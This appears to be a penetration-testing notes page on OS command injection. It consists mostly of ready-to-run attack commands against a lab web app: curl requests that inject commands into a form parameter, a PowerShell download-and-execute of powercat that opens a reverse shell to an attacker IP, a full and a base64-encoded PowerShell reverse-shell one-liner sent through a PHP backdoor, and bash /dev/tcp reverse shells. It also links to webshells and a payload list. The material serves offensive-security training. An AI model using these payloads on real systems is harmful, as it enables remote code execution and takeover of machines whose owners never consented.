# OS Command injection (RCE)

{% code title="Using git version to detect the operating system" overflow="wrap" lineNumbers="true" %}
```
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
```
{% endcode %}

{% code title="Entering git and ipconfig with encoded semicolon" overflow="wrap" lineNumbers="true" %}
```
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```
{% endcode %}

{% code title="Code Snippet to check where our code is executed" overflow="wrap" lineNumbers="true" %}
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
{% endcode %}

{% code title="Determining where the injected commands are executed" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

...
See 'git help git' for an overview of the system.
PowerShell
```
{% endcode %}

{% code title="Serve Powercat via Python3 web server" overflow="wrap" lineNumbers="true" %}
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
```
{% endcode %}

{% code title="Downloading Powercat and creating a reverse shell via Command Injection" overflow="wrap" lineNumbers="true" %}
```
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```
{% endcode %}

## Powershell reverse shell oneliner

Or we could have used a Powershell reverse shell oneliner [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

{% code title="PS oneliner" overflow="wrap" lineNumbers="true" %}
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

### Encoded PS oneliner

{% code title="Encoding the oneliner in PowerShell on Linux" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
```
{% endcode %}

{% code title="Using curl to send the base64 encoded reverse shell oneliner" overflow="wrap" lineNumbers="true" %}
```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
{% endcode %}

## From CMD with PS oneliner

{% code title="powershell.exe + Above command" overflow="wrap" lineNumbers="true" %}
```
CMD> powershell.exe $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

## Bash Reverse shell oneliner

{% code title="bash shell oneliner" overflow="wrap" lineNumbers="true" %}
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
/bin/bash -i >& /dev/tcp/192.168.XXX.XXX/443 0>&1
bash -c "/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1"
```
{% endcode %}

{% hint style="info" %}
[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
{% endhint %}

## ASPX webshell and shell

Use webshell from /usr/share/webshells/aspx to execute commands on the victim VM.

This is an aspx reverse shell that can be used if upload is working. [https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

## Types of command injection

1. Blind command injection
2. Verbose command injection

Detecting Blind Command Injection

You can try using ping, sleep, or output the result to a file with ">" and after that read the contents with "cat"

using curl

{% hint style="info" %}
cheatsheet with command injection payloads

[https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)
{% endhint %}
